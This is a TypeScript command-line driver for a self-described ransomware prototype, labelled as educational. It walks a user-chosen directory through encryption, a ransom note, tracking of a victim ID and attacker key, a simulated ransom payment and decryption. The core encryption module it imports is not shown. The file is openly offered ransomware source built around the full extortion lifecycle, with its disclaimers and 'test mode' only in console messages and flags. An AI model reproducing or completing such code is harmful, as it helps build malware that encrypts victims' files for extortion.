import path from 'path'
import fs from 'fs'
import { createInterface } from 'readline'
import {
    encryptTargetFiles,
    decryptFiles,
    simulatePayment,
    verifyPayment,
    createPaymentReceipt,
    saveEncryptionResults,
    loadEncryptionResults,
    encryptionResultsExist,
    EncryptionResults
} from './ransomware'

// Create readline interface for user input
const rl = createInterface({
    input: process.stdin,
    output: process.stdout
})

// Store the encryption results for later decryption
let encryptionResults: EncryptionResults | null = null

// Main function to run the demo
async function runRansomwareDemo() {
    console.log('============================================================')
    console.log('              RANSOMWARE PROTOTYPE DEMONSTRATION            ')
    console.log('          FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY        ')
    console.log('============================================================')
    console.log(
        '\nWARNING: This prototype is designed to simulate ransomware behavior'
    )
    console.log(
        'in a controlled environment. It should NEVER be used for malicious purposes.\n'
    )
    console.log('Select an operation:')
    console.log('1. Encrypt files (TEST MODE - Safe for demonstration)')
    console.log('2. Decrypt files (requires previous encryption)')
    console.log('3. Simulate full attack lifecycle')
    console.log('4. Load encryption results from file')
    console.log('5. Exit\n')
    rl.question('Enter your choice (1-5): ', async (choice) => {
        switch (choice) {
            case '1':
                await runEncryption()
                break
            case '2':
                await runDecryption()
                break
            case '3':
                await runFullLifecycle()
                break
            case '4':
                await loadEncryptionResultsFromFile()
                break
            case '5':
                console.log('\nExiting program. Goodbye!')
                rl.close()
                break
            default:
                console.log('\nInvalid choice. Please try again.')
                runRansomwareDemo()
                break
        }
    })
}

// Function to run the encryption process
async function runEncryption() {
    console.log('\n=== ENCRYPTION PROCESS ===\n')

    rl.question('Enter the target directory path: ', async (targetDir) => {
        try {
            console.log(`\nTarget directory: ${targetDir}`)
            console.log(
                'Encrypting files in TEST MODE (no files will be deleted)...\n'
            )

            // Run the encryption process
            encryptionResults = await encryptTargetFiles(targetDir, true)

            // Save encryption results to a file
            const resultsPath = saveEncryptionResults(
                encryptionResults,
                targetDir
            )

            console.log(`\nEncryption complete!`)
            console.log(`Victim ID: ${encryptionResults.victimId}`)
            console.log(
                `Files encrypted: ${encryptionResults.encryptedFiles.length}`
            )
            console.log(
                `Total data encrypted: ${
                    encryptionResults.encryptionStats.totalSize / (1024 * 1024)
                } MB`
            )
            console.log(
                `Time taken: ${encryptionResults.encryptionStats.encryptionTime.toFixed(
                    2
                )} seconds`
            )
            console.log(
                '\nA ransom note has been created in the target directory.'
            )
            console.log(`Encryption results saved to: ${resultsPath}`)
            console.log(
                'To decrypt the files, use option 2 from the main menu.\n'
            )

            // Return to main menu
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        } catch (err) {
            console.error(`\nError during encryption: ${err}`)
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        }
    })
}

// Function to run the decryption process
async function runDecryption() {
    console.log('\n=== DECRYPTION PROCESS ===\n')

    rl.question('Enter the target directory path: ', async (targetDir) => {
        try {
            console.log(`\nTarget directory: ${targetDir}`)

            // Check if encryption results exist in memory or need to be loaded from file
            let currentEncryptionResults = encryptionResults

            // If no encryption results in memory, try to load from file
            if (!currentEncryptionResults) {
                if (encryptionResultsExist(targetDir)) {
                    console.log('Loading encryption results from file...')
                    try {
                        currentEncryptionResults =
                            loadEncryptionResults(targetDir)
                        console.log(
                            `Loaded encryption results for victim ID: ${currentEncryptionResults.victimId}`
                        )
                    } catch (loadError) {
                        console.error(
                            `Error loading encryption results: ${loadError}`
                        )
                        rl.question(
                            'Press Enter to return to the main menu...',
                            () => {
                                runRansomwareDemo()
                            }
                        )
                        return
                    }
                } else {
                    console.log(
                        'No encryption results found. Please encrypt files first or provide a directory with existing results.'
                    )
                    rl.question(
                        'Press Enter to return to the main menu...',
                        () => {
                            runRansomwareDemo()
                        }
                    )
                    return
                }
            }

            console.log('Decrypting files...\n')

            // Simulate payment
            const { transactionId } = simulatePayment(
                currentEncryptionResults.victimId
            )
            console.log(`Payment simulation: Transaction ID ${transactionId}`)

            // Verify payment
            const verified = verifyPayment(transactionId)
            console.log(
                `Payment verification: ${verified ? 'Successful' : 'Failed'}`
            )

            if (verified) {
                // Create payment receipt
                createPaymentReceipt(
                    currentEncryptionResults.victimId,
                    transactionId,
                    targetDir
                )
                console.log('Payment receipt created in the target directory.')

                // Decrypt files
                const decryptedFiles = await decryptFiles(
                    targetDir,
                    currentEncryptionResults.encryptedAESKey,
                    currentEncryptionResults.attackerPrivateKey
                )

                console.log(`\nDecryption complete!`)
                console.log(`Files decrypted: ${decryptedFiles.length}`)
                console.log(
                    '\nAll files have been restored to their original state.'
                )
                console.log(
                    'The ransom note and metadata files have been removed.\n'
                )

                // Delete encryption results file after successful decryption
                const resultsPath = path.join(
                    targetDir,
                    'encryption_results.dat'
                )
                if (fs.existsSync(resultsPath)) {
                    fs.unlinkSync(resultsPath)
                    console.log('Encryption results file deleted.')
                }
            } else {
                console.log(
                    '\nPayment verification failed. Files will not be decrypted.\n'
                )
            }

            // Return to main menu
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        } catch (err) {
            console.error(`\nError during decryption: ${err}`)
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        }
    })
}

// Function to run the full lifecycle
async function runFullLifecycle() {
    console.log('\n=== FULL RANSOMWARE LIFECYCLE SIMULATION ===\n')

    rl.question('Enter the target directory path: ', async (targetDir) => {
        try {
            console.log(`\nTarget directory: ${targetDir}`)
            console.log('Starting full lifecycle simulation...\n')

            // Step 1: Encryption
            console.log('STEP 1: Encryption Process\n')
            encryptionResults = await encryptTargetFiles(targetDir, true)

            // Save encryption results to file
            const resultsPath = saveEncryptionResults(
                encryptionResults,
                targetDir
            )
            console.log(`Encryption results saved to: ${resultsPath}`)

            console.log(`\nEncryption complete!`)
            console.log(`Victim ID: ${encryptionResults.victimId}`)
            console.log(
                `Files encrypted: ${encryptionResults.encryptedFiles.length}`
            )
            console.log(
                `Total data encrypted: ${
                    encryptionResults.encryptionStats.totalSize / (1024 * 1024)
                } MB`
            )
            console.log(
                `Time taken: ${encryptionResults.encryptionStats.encryptionTime.toFixed(
                    2
                )} seconds`
            )
            console.log(
                '\nA ransom note has been created in the target directory.'
            )

            // Step 1.5: Demonstrate loading encryption results from file
            console.log('\nSTEP 1.5: Demonstrating Persistence\n')
            console.log(
                'Clearing encryption results from memory and loading from file...'
            )

            // Clear in-memory results to simulate a new session
            const victimId = encryptionResults.victimId
            encryptionResults = null

            // Load results from file
            if (encryptionResultsExist(targetDir)) {
                console.log('Loading encryption results from saved file...')
                encryptionResults = loadEncryptionResults(targetDir, victimId)
                console.log(
                    `Successfully loaded encryption results for victim ID: ${encryptionResults.victimId}`
                )
            } else {
                console.error('Failed to find encryption results file.')
                throw new Error('Persistence demonstration failed')
            }

            // Step 2: Payment Simulation
            console.log('\nSTEP 2: Payment Simulation\n')
            const { transactionId } = simulatePayment(
                encryptionResults.victimId
            )
            console.log(`Payment simulation: Transaction ID ${transactionId}`)

            // Step 3: Payment Verification
            console.log('\nSTEP 3: Payment Verification\n')
            const verified = verifyPayment(transactionId)
            console.log(
                `Payment verification: ${verified ? 'Successful' : 'Failed'}`
            )

            // Step 4: Decryption
            console.log('\nSTEP 4: Decryption Process\n')

            if (verified) {
                // Create payment receipt
                createPaymentReceipt(
                    encryptionResults.victimId,
                    transactionId,
                    targetDir
                )
                console.log('Payment receipt created in the target directory.')

                // Decrypt files
                const decryptedFiles = await decryptFiles(
                    targetDir,
                    encryptionResults.encryptedAESKey,
                    encryptionResults.attackerPrivateKey
                )

                console.log(`\nDecryption complete!`)
                console.log(`Files decrypted: ${decryptedFiles.length}`)
                console.log(
                    '\nAll files have been restored to their original state.'
                )
                console.log(
                    'The ransom note and metadata files have been removed.\n'
                )

                // Delete encryption results file after successful decryption
                const resultsPath = path.join(
                    targetDir,
                    'encryption_results.dat'
                )
                if (fs.existsSync(resultsPath)) {
                    fs.unlinkSync(resultsPath)
                    console.log('Encryption results file deleted.')
                }
            } else {
                console.log(
                    '\nPayment verification failed. Files will not be decrypted.\n'
                )
            }

            console.log('\nFull lifecycle simulation complete!\n')

            // Return to main menu
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        } catch (err) {
            console.error(`\nError during lifecycle simulation: ${err}`)
            rl.question('Press Enter to return to the main menu...', () => {
                runRansomwareDemo()
            })
        }
    })
}

// Function to load encryption results from a file
async function loadEncryptionResultsFromFile() {
    console.log('\n=== LOAD ENCRYPTION RESULTS ===\n')

    rl.question(
        'Enter the directory containing encryption results: ',
        async (directory) => {
            try {
                if (encryptionResultsExist(directory)) {
                    console.log('Loading encryption results from file...')

                    encryptionResults = loadEncryptionResults(directory)

                    console.log(`\nEncryption results loaded successfully!`)
                    console.log(`Victim ID: ${encryptionResults.victimId}`)
                    console.log(
                        `Files encrypted: ${encryptionResults.encryptedFiles.length}`
                    )
                    console.log(
                        `Total data encrypted: ${(
                            encryptionResults.encryptionStats.totalSize /
                            (1024 * 1024)
                        ).toFixed(2)} MB`
                    )
                    console.log(
                        `Encryption timestamp: ${encryptionResults.encryptionStats.timestamp.toLocaleString()}`
                    )
                    console.log(
                        '\nYou can now use option 2 from the main menu to decrypt the files.\n'
                    )
                } else {
                    console.log(
                        `\nNo encryption results found in directory: ${directory}`
                    )
                    console.log(
                        'Please check the directory path and try again.\n'
                    )
                }

                // Return to main menu
                rl.question('Press Enter to return to the main menu...', () => {
                    runRansomwareDemo()
                })
            } catch (err) {
                console.error(`\nError loading encryption results: ${err}`)
                rl.question('Press Enter to return to the main menu...', () => {
                    runRansomwareDemo()
                })
            }
        }
    )
}

// Start the demo
runRansomwareDemo()
